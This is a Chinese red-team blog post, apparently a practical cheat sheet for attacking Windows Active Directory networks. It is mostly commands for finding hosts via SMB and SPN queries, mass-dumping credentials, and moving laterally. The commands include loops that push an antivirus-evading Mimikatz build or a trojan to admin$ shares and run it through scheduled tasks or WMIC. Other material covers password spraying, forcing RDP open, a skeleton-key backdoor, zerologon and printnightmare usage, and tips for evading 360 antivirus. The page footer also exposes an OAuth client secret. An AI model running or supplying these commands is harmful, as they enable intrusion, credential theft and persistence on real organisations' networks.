<h1 id="ad域渗透-smb扫描快速获取内网windows">AD域渗透-SMB扫描（快速获取内网Windows）</h1>
<pre><code>1.原始nbtscan.exe，实战需要处理：

nbtscan.exe 10.10.10.0/16 &gt;&gt; smb.txt

2. fscan.exe, 实战也要处理：

fscan.exe -h 10.10.10.0/16 -m nbtbios -o smb.txt

3. 苛刻环境，正向代理：

msf代理进去，线程拉低10，选择模块smb_version探测

4. cme Windows主机探测,实战自行编译免杀处理

cme.exe -t 10.10.10.0/24 

tasklist /svc | findstr &quot;cme.exe&quot;

5. SharpNetInfoScan 基于139端口解析：

SharpNetInfoScan.exe -h 10.10.10.10/24

6. 基于SPN结果，进行windows探测：

grep 'CN=' spn.txt | awk -F ','{'print $1'} | awk -F '=' {'print$2'} &gt; host.txt
tail -n 30 host.txt
for /f &quot;delims=&quot; %i in host.txt do @ping -w 1 -n 1 %i | findstr /c:&quot;.xxx.com|&quot; &gt;&gt; host_res.txt

# Windwos 7 以后都默认自带setspn

setspn T DC-Name Q */* | findstr &quot;MSSQLSvc&quot; # 直接过滤Mssql服务

# 因为得到的spn结果，可能都不存活，我们批量Ping一下，判断存活

awk F &quot;/&quot; {'print $2'} mac.txt | awk F &quot;.&quot; {'print $1'} | uniq &gt; res.txt

for /f &quot;delims=&quot; %i in (res.txt) do @ping w 1 n 1 %i | findstr /c:&quot; DC-name &quot; &gt;&gt; PerfLogs news.txt

setspn T dc-name Q */* | findstr &quot;oracle&quot; # 同理过滤“Oracle服务”，其他同类数据库服务也如此
借助 SPN 快速 定位当前目标 域中 所有 存活 的 ldap 服务器：
# 通常情况下，都为域控制器

setspn T dc-name Q */* | findstr &quot;ldap&quot; # 所有 LDAP SPN 的 机器名 都带有典型 的 DC 字样
借助 SPN 快速 定位当前目标 域中 邮件 服务器：
setspn T dc-name Q */* | findstr &quot;exchangeMDB&quot;
setspn T dc-name Q */* | findstr &quot;SMTPSVC&quot;
setspn T dc-name Q */* | findstr &quot;IMAP&quot;c v 
setspn T dc-name Q */* | findstr &quot;POP3&quot;

awk F '/' {'print $2'} mail.txt | awk F '.' {'print $1'} | uniq # 筛选各类主机名

# 批量存活探测

for /f &quot;delims=&quot; %i in (mail.txt) do @ping w 1 n 1 %i | findstr /c:&quot; dc-name &quot; &gt;&gt; mail-re.txt

借助 SPN 快速 定位当前目标 域中 Web 服务器：

setspn T dc-name Q */* | findstr &quot;HTTP&quot;
setspn T dc-name Q */* | findstr &quot;HTTPS&quot;
for /f &quot;delims=&quot; %i in (webs.txt) do @ping w 1 n 1 %i | findstr /c:&quot; dc-name &quot; &gt;&gt; # Web服务

借助 SPN 快速 定位当前 目标 域 中 所有 存活的 DNS 服务器

setspn T dc-name Q */* | findstr &quot;DNS&quot;
for /f &quot;delims=&quot; %i in (dns.txt) do @ping w 1 n 1 %i | findstr /c:&quot; dc-name &quot; &gt;&gt;  dns.txt

借助 SPN 快速 定位当前 目标 域 中 所有 存活的 文件 服务器

setspn T dc-name Q */* | findstr &quot;ftp&quot;
setspn T dc-name Q */* | findstr &quot;nfs&quot;

for /f &quot;delims=&quot; %i in (ftp.txt) do @ping w 1 n 1 %i | findstr /c:&quot; dc-name &quot; &gt;&gt;  dns.txt

借助 SPN 快速 定位当前 目标 域 中 所有 开启远程 连接服务 服务器
setspn T dc-name Q */* | findstr &quot;TERMSRV&quot; &gt;&gt;&gt; PerfLogs rdp .txt
setspn T dc-name Q */* | findstr &quot;WSMAN&quot; &gt;&gt; C: PerfLogs winrm .txt
setspn T dc-name Q */* | findstr &quot;vnc&quot; &gt;&gt; C: PerfLogs vnc .txt
setspn T dc-name Q */* | findstr &quot;vpn&quot; &gt;&gt; C: PerfLogs vpn .txt
setspn T dc-name Q */* | findstr &quot;tnetdgines&quot; &gt;&gt; C: PerfLogs tnetdgines .txt
awk F '/' {'print $2'} **.txt | awk F '.' {'print $1'} | uniq | wc -l
</code></pre>
<h1 id="ad域渗透-外网资产内网资产定位">AD域渗透-外网资产/内网资产定位：</h1>
<pre><code>grep 'CN=' spn.txt | awk -F ','{'print $1'} | awk -F '=' {'print $2'} &gt; host_res.txt

# Linux:(筛选重点主机)

egrep -i 'sql|file|vpn|mail|smtp|pop|imap|web|share|monitor|erp|login|oa|print|server|vcenter|vm'

# 准备目标外网各类域名，汇总文件domain.txt

for /f &quot;delims=&quot; %i in (domain.txt) do @ping -w 1 -n 1 %i | findstr /c:&quot;[10.&quot; /c:&quot;[192.&quot; /c:&quot;[172.&quot; &gt;&gt; web-out.txt


# 通过以上的方法获取到大致的C段，批量进行webTitle识别，确定对应段的各类应用：

1. fscan获取WebTitle/指纹

fscan.exe -hf target.txt -nopoc -nop -o title.txt 

2. Ladon

Ladon.exe WhatWeb 10.10.10.0/16 &gt;&gt; title.txt

3. 苛刻环境，存活探测：

for /l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1 | find /i &quot;ttl&quot;导出成文本： @for /l %i in (1,1,255) do @ping -n 1 -w 40 192.168.0.%i &amp; if errorlevel 1 (echo 192.168.0.%i&gt;&gt;c:\a.txt) else (echo 192.168.0.%i &gt;&gt;c:\b.txt)

</code></pre>
<h1 id="ad域渗透-信息收集">AD域渗透-信息收集</h1>
<p><code>贯穿横向每个阶段，拿到一部分权限，就来一次</code></p>
<pre><code>1. 批量抓进程，筛选敏感进程，敏感用户，有大概六直接伪造Token实现获取域控权限：

（1） atexec 实现获取进程列表，保存本地，手工筛选

  ## 本机操作：
  
   mimikatz进行注入，注入目标主机票据，把本机挂代理进去，后续进行操作：
   atexec.exe ./administrator:loecho@123..@10.10.10.1 &quot;tasklist&quot;
   
  ## 被控机操作：
  
  将当前Beacon注入到对应进程，获取目标权限
  atexec.exe ./administrator:loecho@123..@10.10.10.1 &quot;tasklist&quot;
 
 ## 1. 批量抓，假设用户密码一样，后续筛选重点进程：
 
 for /f &quot; %i in win2success.txt do atexec.exe ./administrator:loecho123..@i &gt;&gt; allTasklist.txt

# 筛选重点进程，杀软、数据库、phpstudy、vpn、域管用户（域管理员实际目标名称添加）等等

egrep 'cily|adadmin|adadmin02|xxxx-igrp|leagsoft|shenluyan|xiefp|wulh|sunyingyun|zhangx' process.txt

## 2. 不依赖工具抓，自身tasklist

for /f %i in (ip.txt) do echo %i &gt;&gt; process.txt &amp; tasklist /s %i/u &quot;.\administrator&quot; /p &quot;loecho123..&quot; /V /FO CSV &gt;&gt; process.txt

egrep 'cily|adadmin|adadmin02|xxxx-igrp|leagsoft|shenluyan|xiefp|wulh|sunyingyun|zhangx' process.txt
</code></pre>
<ol start="2">
<li>批量抓已获取口令主机的Hash、密码：</li>
</ol>
<p>（抓密码工具一定要免杀，或者你直接把lsass.exe Dump下离线解密也可以）</p>
<p><code>手工搞，依赖计划任务，files64.exe为修改版免杀MImikatz一键版本：</code></p>
<pre><code>for /f %i in (ip.txt) do net use N%i\admin$/user:&quot;administrator&quot; &quot;IT1231&quot; &amp; if %errorlevel% equ 0(copy files64.exe \%iladmin$\debug\/Y)&amp; schtasks /create/s&quot;%i&quot;/u &quot;administrator&quot;/p &quot;IT1231&quot; /RL HIGHEST /F/tn&quot;SysDebug&quot;/tr&quot;c:\windows\debug\files64.exe&quot;/sc DAILY/mo1/ST07:25/RUSYSTEM&amp;schtasks/run/tnSysDebug/s&quot;%i&quot;/U &quot;administrator&quot;/P &quot;IT1231&quot;&amp; schtasks/delete/F/tn SysDebug/s&quot;%i&quot;/U&quot;administrator&quot;/P&quot;IT1231&quot;&amp;@ping 127.0.0.0.1 -n 1 &gt;nul &amp; move W%i\admin$\temp\dumps.logs C:\Users\Public\%i.logs &amp; del W%i\admin$\debug\files64.exe/F&amp;net use N%i\admin$/del

</code></pre>
<p>(2) WMIC直接搞</p>
<pre><code>for /f %i in (ip.txt) do net use 11%i\adminS/user:&quot;administrator&quot; &quot;IT1231&quot; &amp; if %errorlevel% equ 0(copy files64.exe ll%i\admin$\debug\/Y) &amp; wmic/NODE:&quot;%i&quot; /user:&quot;administrator&quot; /password:&quot;IT1231&quot; PROCESS call create &quot;c:\windows\debug\files64.exe&quot; &amp; @ping 127.0.0.1-n3&gt;nul &amp; move N%i\adminS\temp\dumps.logs C:\Users\Publicl%i.logs &amp; del 11%iladminS\debuglfiles64.exe/F net use N%iladmin$/del
</code></pre>
<p>(3) 依赖SharpKatz工具，免杀处理：</p>
<pre><code>SharpKatz_x64.exe -h

Example: SharpKatz.exe --Command logonpasswords
Example: SharpKatz.exe --Command ekeys
Example: SharpKatz.exe --Command msv
Example: SharpKatz.exe --Command kerberos
Example: SharpKatz.exe --Command tspkg
Example: SharpKatz.exe --Command credman
Example: SharpKatz.exe --Command wdigest
Example: SharpKatz.exe --Command dcsync --User user --Domain userdomain --DomainController dc
Example: SharpKatz.exe --Command dcsync --Guid guid --Domain userdomain --DomainController dc
Example: SharpKatz.exe --Command dcsync --Domain userdomain --DomainController dc
Example: SharpKatz.exe --Command pth --User username --Domain userdomain --NtlmHash ntlmhash
Example: SharpKatz.exe --Command pth --User username --Domain userdomain --Rc4 rc4key
Example: SharpKatz.exe --Command pth --Luid luid --NtlmHash ntlmhash
Example: SharpKatz.exe --Command pth --User username --Domain userdomain --NtlmHash ntlmhash --aes128 aes256
Example: SharpKatz.exe --Command zerologon --Mode check --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$
Example: SharpKatz.exe --Command zerologon --Mode exploit --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$
Example: SharpKatz.exe --Command zerologon --Mode auto --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$ --Domain testlab2.local --User krbtgt --DomainController WIN-NSE5CPCP07C.testlab2.local
Example: SharpKatz.exe --Command printnightmare --Target dc --Library \\mycontrolled\share\fun.dll
Example: SharpKatz.exe --Command printnightmare --Target dc --Library \\mycontrolled\share\fun.dll --AuthUser user --AuthPassword password --AuthDomain dom
Example: SharpKatz.exe --Command hiveghtmare
Example: SharpKatz.exe --Command dumpsam --System \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM --Sam \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
Example: SharpKatz.exe --Command listshadows
</code></pre>
<p>(4) 各类软件密码解密：</p>
<pre><code>360 安全浏览器
Chrome 解密
Firefox 解密
Flashfxp 解密
Foxmail 邮件客户端解密
IIS 解密
MobaXterm 解密
Navicat 解密
PlSQL解密
Royal TS 离线解密
SecureCRT 解密
SSMS 客户端解密
Thunderbird 离线解密
TortoiseSVN  解密
VNC 解密
WinSCP 解密
Xshell Xftp 解密

# MySQL数据库：

1. 将目标mysql/data/mysql/user.MYD mysql/data/mysql/user.frm mysql/data/mysql/user.MYI 下载回本地

2. 拖到自己mySQL的对应目录下，修改参数：skip-grant-tables 

3. 连接数据库，查询select host，user，password from user，CMD5查一下对应Hash

# MSSQL数据库：

1. mimikatz&quot;privilege::debug&quot;sekurlsa:pth/user:administrator/domain:./ntlm:hash /run:\&quot;C:\*\SocksCap64\SocksCap64_RunAsAdmin.exel&quot;&quot; &quot;exit&quot;

2. 代理挂进去，通过Windows身份认证直接连接，MSSQL数据库

</code></pre>
<h1 id="ad域渗透-横向渗透winrm5985">AD域渗透-横向渗透WINRM（5985):</h1>
<pre><code>条件:

1、适用于 win7 及以后的系统，win7 和 server 08 默认关闭
2、server 12 之后的版本才默认允许远程任意主机进行管理
3、防火墙未过滤 5985、5986 端口


1. 自带工具：

#查看WinRM状态
winrm enumerate winrm/config/listener

#开启WinRM远程管理

Enable-PSRemoting –force

#设置WinRM自启动

Set-Service WinRM -StartMode Automatic

#对WinRM服务进行快速配置，包括开启WinRM和开启防火墙异常检测,默认的5985端口

winrm quickconfig -q

#对WinRM服务进行快速配置，包括开启WinRM和开启防火墙异常检测，HTTPS传输，5986端口

winrm quickconfig -transport:https

#查看WinRM的配置

winrm get winrm/config

#查看WinRM的监听器

winrm e winrm/config/listener

#为WinRM服务配置认证

winrm set winrm/config/service/auth '@{Basic=&quot;true&quot;}'

#修改WinRM默认端口
winrm set winrm/config/client/DefaultPorts '@{HTTPS=&quot;8888&quot;}'

#为WinRM服务配置加密方式为允许非加密：

winrm set winrm/config/service '@{AllowUnencrypted=&quot;true&quot;}'

#设置只允许指定IP远程连接WinRM

winrm set winrm/config/Client '@{TrustedHosts=&quot;192.168.10.*&quot;}'

#执行命令

winrm invoke create wmicimv2/win32_process -SkipCAcheck -skipCNcheck '@{commandline=&quot;calc.exe&quot;}'

#在dc机器上面执行命令并且指定用户名和密码

winrm invoke Create wmicimv2/win32_process @{CommandLine=&quot;calc.exe&quot;} -r:dc -u:one\administrator -p:q123456.


winrs -r:192.168.22.33 -u:administrator -p:p@assw0rd ipconfig

2. https://github.com/Hackplayers/evil-winrm # 开源工具

3.https://github.com/bohops/WSMan-WinRM # 集合攻击，包括exe、ps1、js等

Usage

SharpWSManWinRM.cs

 Usage: SharpWSManWinRM.exe &lt;hostname&gt; &lt;command&gt;
 Usage: SharpWSManWinRM.exe &lt;hostname&gt; &lt;command&gt; &lt;domain\user&gt; &lt;password&gt;

 Example: SharpWSManWinRM.exe host.domain.local notepad.exe
 Example: SharpWSManWinRM.exe host.domain.local &quot;cmd /c notepad.exe&quot; domain\joe.user P@ssw0rd
 
 
WSManWinRM.ps1

 Usage: Invoke-WSManWinRM -hostname &lt;hostname&gt; -command &lt;command&gt;
 Usage: Invoke-WSManWinRM -hostname &lt;hostname&gt; -command &lt;command&gt; -user &lt;domain\user&gt; -password &lt;password&gt;

 Example: import-module .\WSManWinRM.ps1
          Invoke-WSManWinRM -hostname MyServer.domain.local -command calc.exe
 Example: import-module .\WSManWinRM.ps1
          Invoke-WSManWinRM -hostname MyServer.domain.local -command calc.exe -user domain\joe.user -password P@ssw0rd

WSManWinRM.vbs
 Usage: cscript.exe SharpWSManWinRM.vbs &lt;hostname&gt; &lt;command&gt;
 Usage: cscript.exe SharpWSManWinRM.vbs &lt;hostname&gt; &lt;command&gt; &lt;domain\user&gt; &lt;password&gt;

 Example: cscript.exe SharpWSManWinRM.vbs host.domain.local notepad.exe
 Example: cscript.exe SharpWSManWinRM.vbs host.domain.local &quot;cmd /c notepad.exe&quot; domain\joe.user P@ssw0rd

WSManWinRM.js
 Usage: cscript.exe SharpWSManWinRM.js &lt;hostname&gt; &lt;command&gt;
 Usage: cscript.exe SharpWSManWinRM.js &lt;hostname&gt; &lt;command&gt; &lt;domain\user&gt; &lt;password&gt;

 Example: cscript.exe SharpWSManWinRM.js host.domain.local notepad.exe
 Example: cscript.exe SharpWSManWinRM.js host.domain.local &quot;cmd /c notepad.exe&quot; domain\joe.user P@ssw0rd

CppWSManWinRM.cpp 
Usage: CppWSManWinRM.exe &lt;hostname&gt; &lt;command&gt;

 Example: CppWSManWinRM.exe host.domain.local notepad.exe
 Note: Username/password option does not work yet

</code></pre>
<h1 id="ad域渗透-横向渗透smb445">AD域渗透-横向渗透SMB(445)：</h1>
<pre><code># 汇总以获取到的各类密码，如数据库密码，主机hash解密密码，文件保存密码等等

1. fscan SMB模块探测：

fscan.exe -hf smb.txt -pf pwd.txt -o smb2win.txt

2. crack 弱口令检测：

for /c &quot;delims=&quot; %i in smb.txt do crack.exe -i %i -P pwd.txt -U user.txt &gt;&gt; smb2win.txt

3. 国内目标，代理流畅情况下：

（1） 超级弱口令工具，用代理挂进内网，进行扫描
（2）MSF的smb_login挂进内网，指定文件smb.txt，进行扫描

</code></pre>
<h1 id="ad域渗透-横向渗透wmic139135">AD域渗透-横向渗透WMIC（139/135）：</h1>
<pre><code>注意：（手艺活不能丢了，上线后维权，操作基于用户权限，不要SYSTEM权限）

1. 手工搞，直接执行SysDebug.exe,目标10.10.10.1，用户名：administrator 密码：loecho@123.. 木马：SysDebug.exe ：(只能执行一次)

net use \\10.10.10.1\admin$ /user:&quot;administrator&quot; &quot;loecho@123..&quot;

copy SysDebug.exe \\10.10.10.1\admin$\debug

wmic /NODE:&quot;10.10.10.1&quot; /user:&quot;administrator&quot; /password:&quot;loecho@123..&quot; PROCESS call create &quot;C:\Windows\Debug\SysDebug.exe&quot;

del \\10.10.10.1\admin$\debug\SysDebug.exe /F

net use \\10.10.10.1\admin$ /del

2. 远程计划任务

schtasks / create /s &quot;10.10.10.1&quot; / u &quot;administrator&quot; / p &quot;loecho@123..&quot; / RL HIGHEST /F /tn &quot;SysDebug&quot; /tr c:\windows\debug\SysDebug.exe&quot;/sc DAILY/mo 1/ST 08:25/RU SYSTEM

schtasks /query /s &quot;10.10.10.1&quot; /U &quot;administrator&quot; /P &quot;loecho@123..&quot; | findstr &quot;SysDebug&quot;

schtasks /run /tn SysDebug /s &quot;10.10.10.1&quot; /U &quot; administrator&quot; /P &quot;loecho@123..&quot;

schtasks /delete /F /tn SysDebug /s &quot;10.10.10.1&quot; /U &quot; administrator&quot; /P &quot;loecho123..&quot;

3. WMIHACKER 进行横向：（https://github.com/rootclay/WMIHACKER/blob/master/README_zh.md）

C:\Users\administrator\Desktop&gt;cscript //nologo WMIHACKER_0.6.vbs

__          ____  __ _____   _    _          _____ _  ________ _____
\ \        / /  \/  |_   _| | |  | |   /\   / ____| |/ /  ____|  __ \
 \ \  /\  / /| \  / | | |   | |__| |  /  \ | |    | ' /| |__  | |__) |
  \ \/  \/ / | |\/| | | |   |  __  | / /\ \| |    |  &lt; |  __| |  _  /
   \  /\  /  | |  | |_| |_  | |  | |/ ____ \ |____| . \| |____| | \ \
    \/  \/   |_|  |_|_____| |_|  |_/_/    \_\_____|_|\_\______|_|  \_\
                              v0.6beta       By. Xiangshan@360RedTeam
Usage:
        WMIHACKER.vbs  /cmd  host  user  pass  command GETRES?

        WMIHACKER.vbs  /shell  host  user  pass

        WMIHACKER.vbs  /upload  host  user  pass  localpath remotepath

        WMIHACKER.vbs  /download  host  user  pass  localpath remotepath

          /cmd          single command mode
          host          hostname or IP address
          GETRES?       Res Need Or Not, Use 1 Or 0
          command       the command to run on remote host


有命令回显执行方式

&gt; cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator &quot;Password!&quot; &quot;systeminfo&quot; 1

无命令回显

&gt; cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator &quot;Password!&quot; &quot;systeminfo &gt; c:\1.txt&quot; 0

模拟shell模式

&gt; cscript WMIHACKER_0.6.vbs /shell 172.16.94.187 administrator &quot;Password!&quot;

文件上传-复制本机calc.exe到远程主机c:\calc.exe

&gt; cscript wmihacker_0.4.vbe /upload 172.16.94.187 administrator &quot;Password!&quot; &quot;c:\windows\system32\calc.exe&quot; &quot;c:\calc&quot;

文件下载-下载远程主机calc.exe到本地c:\calc.exe

&gt; cscript wmihacker_0.4.vbe /download 172.16.94.187 administrator &quot;Password!&quot; &quot;c:\calc&quot; &quot;c:\windows\system32\calc.exe&quot;


# 暂时还能过 360, 如卡住多试几次就好, 单纯的远程执行下命令没啥问题
cscript //nologo wmihacker.vbs /cmd 192.168.159.7 administrator &quot;admin!@#45&quot; &quot;tasklist&quot; 1
cscript //nologo wmihacker.vbs /cmd 192.168.159.19 klion\its &quot;admin!@#45&quot; &quot;query user&quot; 1

# 由于程序内部还是用批处理在循环取结果, 默认直接调的 cmd.exe 会触发 360 拦截, 取不到结果

WMIcmd.exe -h 192.168.159.19 -u its -p admin!@#45 -d klion -c &quot;systeminfo&quot; -s 50000
WMIcmd.exe -h 192.168.159.7 -u administrator -p admin!@#45 -d . -c &quot;systeminfo&quot; -s 50000

# 无法在命令里执行重定向操作, 会触发 360 报警

cscript wmiexec.vbs /cmd 192.168.159.7 .\administrator admin!@#45 &quot;netstat -ano -wait8000&quot;
cscript wmiexec.vbs /cmd 192.168.159.19 klion\its admin!@#45 &quot;query user -wait8000&quot;

</code></pre>
<h1 id="ad域渗透-横向渗透rdp3389">AD域渗透-横向渗透RDP（3389）</h1>
<pre><code>假设拿到DMZ区域的WEB服务器,DumpHash后，获得密码格式
# IP： 10.10.10.130   密码： ABCD130!@.

# 仔细划分为三部分：

# ABCD  目标公司名称简称 

# 130	目标系统IP的C段地址

# !@.	密码策略问题，加的特殊字符

# 由此可以猜测主机内其他机器管理员密码情况，从而定点横向，从WEB到数据库从数据库到核心。。。。

（2） 通过高权限用户配合高密码进行横向RDP喷射
高权限域用户，Dump到明文密码，3389端口开启：

RDP端口查看方式：
# 通过注册表查询3389

REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections # 查看RDP服务是否开启：1关闭，0开启

REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber  # 查看RDP服务的端口


# 通过进程查看

tasklist /svc | find &quot;TermService&quot; # 找到对应服务进程的PID
netstat -ano | find &quot;3220&quot; # 找到进程对应的端口号


# 通过监听端口查看

netstat -ano | findstr LIS # 查看当前监听端口，有些情况可能RDP端口更改

强开RDP端口方法:

# 注册表开启，高权限用户：

REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f

REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f  # 监听 3389 端口

# 注册表文件开启，高权限用户：

Windows Registry Editor Version 5.00
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]
&quot;fDenyTSConnections&quot;=dword:00000000
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]
&quot;PortNumber&quot;=dword:00000d3d 

# Wmic启动远程主机RDP服务：

wmic /node: &quot;10.10.10.130&quot; /USER:&quot;10.10.10.130\administrator&quot; PATH win32_erminalservicesetting WHERE (__Class!=&quot;&quot;)

2. 国内目标，网络环境稳定：

超级弱口令工具，挂代理进去内网进行，3389的密码碰撞

（通常SMB喷射完的目标，就以这种方法去连3389）

</code></pre>
<h1 id="ad域渗透-万能密码">AD域渗透-万能密码：</h1>
<pre><code># 所有用户通用密码，skeleton，重启失效

mimikatz.exe privilege::debug &quot;misc::skeleton&quot;
</code></pre>
<h1 id="ad域渗透-通过目标各类服务漏洞进行横向渗透">AD域渗透-通过目标各类服务漏洞，进行横向渗透</h1>
<pre><code>（WEB-Nday、Redis、MSSQL-RCE、MYSQL提权）

</code></pre>

                        </div>
                        
                                
                                                    
                                                                    <!--Share-->
                                                                    <span style="margin-right:15px">
                        <i class="post-share"></i>
                        <span>&#x5206;&#x4EAB;:</span>
                                                                    <a title="QR 码" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://1oecho.github.io/GxKPsWfW5/"><i class="fa fa-qrcode"></i></a>
                                                                    <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://1oecho.github.io/GxKPsWfW5/&sharesource=qzone&title=内网渗透：实战思路以及相关命令&pics=https://1oecho.github.io/images/avatar.png?v=1702539383157&summary="><i class="fa fa-qq"></i></a>
                                                                    <a title="新浪微博" target="_blank" href="https://service.weibo.com/share/share.php?url=https://1oecho.github.io/GxKPsWfW5/&sharesource=weibo&title=内网渗透：实战思路以及相关命令 + " - " + &pic="https://1oecho.github.io/images/avatar.png?v=1702539383157 "><i class="fa fa-weibo "></i></a>

                                                                    </span>
                                                                    
                                                                            <!--zh-->
                                                                            <section class="post-tags zh ">
                                                                                <div>
                                                                                    <span>&#x6807;&#x7B7E;:</span>
                                                                                    <span class="tag ">
                        
                                </span>
                                                                                </div>
                                                                                <div>
                                                                                    <a href="javascript:window.history.back();">
                        &#x8FD4;&#x56DE;</a>
                                                                                    <span>&dot;</span>
                                                                                    <a href="#">&#x4E3B;&#x9875;</a>
                                                                                </div>
                                                                            </section>

                                                                            
                                                                                <!---->
                                                                                <section class="post-nav">
                                                                                    
                                                                                        <a class="prev" rel="prev" href="https://1oecho.github.io/voS1XhbeA/">
                                                                                            攻防实战：实战TIPS集合（持续更新）
                                                                                        </a>
                                                                                        
                                                                                            
                                                                                                <a class="next" rel="next" href="https://1oecho.github.io/Behinder11-2/">
                                                                                                    红队开发: Behinder3-Beta11 实战下的二次开发 （2）
                                                                                                </a>
                                                                                                
                                                                                </section>
                    </article>
                </div>
                
                    
                        <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>

<div id="gitalk-container" style="width: 100%;max-width: 780px;margin: auto;"></div>

<script>
    var gitalk = new Gitalk({
        clientID: '61442cf87c4266a18189',
        clientSecret: '7a1fd1e53e9179e32c4600883cd0612d09e0f292',
        repo: 'loecho',
        owner: '1oecho',
        admin: ['1oecho'],
        id: (location.pathname).substring(0, 49), // Ensure uniqueness and length less than 50
        distractionFreeMode: false // Facebook-like distraction free mode
    })

    gitalk.render('gitalk-container')
</script>
                            
                                        
                                            
            </div>
    </div>
    </div>
    </div>
    
        <footer id="footer" class="footer">
            <div class="copyright">
                
                        loecho-sec
                            
                                <b id="hitokoto"></b><br>
                                
                                        <svg viewBox="0 0 1024 1024" style="margin-left: 5px;margin-right: 5px;" version="1.0" width="8" height="8" class="my-face">
            <path
                d="M863.597631 513.574282l-271.33965-140.213484L729.783667 81.926656c3.583731-7.87141 7.167462-15.742819 7.167462-25.214109C736.887134 25.226908 708.345275 0.012799 672.635953 0.012799a63.611229 63.611229 0 0 0-39.293053 12.607055c-1.791866 1.59988-3.519736 3.19976-5.311602 3.19976L147.87531 418.925381a55.547834 55.547834 0 0 0-19.646527 47.356448c1.791866 17.278704 14.27093 33.021523 32.125591 42.492813l271.33965 141.749369L292.504463 945.221908c-12.479064 25.214109-1.791866 53.563983 23.166262 69.306802 10.751194 6.335525 23.230258 9.47129 35.709322 9.47129 16.062795 0 32.125591-4.735645 44.604655-15.742819l480.091993-403.297753a55.547834 55.547834 0 0 0 19.646526-47.228458 61.243407 61.243407 0 0 0-32.12559-44.156688z"
                fill="#93b5cf"></path>
        </svg>
                                         &copy;Copyright
                                            <script>
                                                var date = new Date();
                                                document.write("" + date.getFullYear());
                                            </script>
                                            | Powered by
                                            <a href="https://1oecho.github.io/" target="_blank">
                                                loecho-sec
                                            </a>
            </div>
            <div id="update" style="display:none;">
                on
            </div>
            
                <div id="version" style="display:none;">
                    1.7.5
                </div>
                
                    <script>
                        var pat = '';
                        
                        document.write('<div id="home_path" style="display:none;">' + document.location.protocol + '//' + window.document.location.hostname + pat + '</div>')
                    </script>
        </footer>
        
            <script src='https://cdn.jsdelivr.net/npm/live2d-widget@3.x/lib/L2Dwidget.min.js'></script>
            
                <script>
                    
                    
                    loadlive2d();
                    
                    
                    hitokoto();
                    
                    getStar();
                    hljs.initHighlighting();
                    console.clear();
                    
                    CheckVersion();
                    
                    var newDate = new Date();
                    newDate.setTime(1702539383157);
                    console.log(" Blog Update Time: " + newDate.toLocaleDateString());
                    console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
                </script>
                
        </div>
</body>
<script>
    scroll();
</script>

</html>